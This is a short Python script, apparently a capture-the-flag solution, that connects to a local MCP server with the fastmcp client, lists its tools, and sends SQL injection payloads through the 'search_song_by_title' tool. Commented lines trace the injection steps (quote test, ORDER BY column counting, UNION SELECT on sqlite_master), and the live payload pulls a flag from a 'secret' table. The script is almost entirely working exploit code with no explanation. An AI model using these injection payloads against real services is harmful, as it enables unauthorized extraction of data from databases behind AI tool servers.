import asyncio
from fastmcp import Client, FastMCP
import json

client = Client("http://127.0.0.1:8080/mcp") # CHANGE IP


async def main():
    async with client:
        # You can check if server is up
        await client.ping()
        print("Server is up !\n")

        # List available tools
        tools = await client.list_tools()
        for tool in tools: # pretty print
            print(json.dumps(tool.model_dump(),indent=4))

        # payload = "el"
        # payload = "'"
        # payload = "' ORDER BY 2 --"
        # payload = "' ORDER BY 3 --"
        # payload = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --"
        payload = "' UNION SELECT flag, flag FROM secret --"
        result = await client.call_tool("search_song_by_title", {"title": payload})
        print(f"\nResult:\n{result.structured_content['result']}")

asyncio.run(main())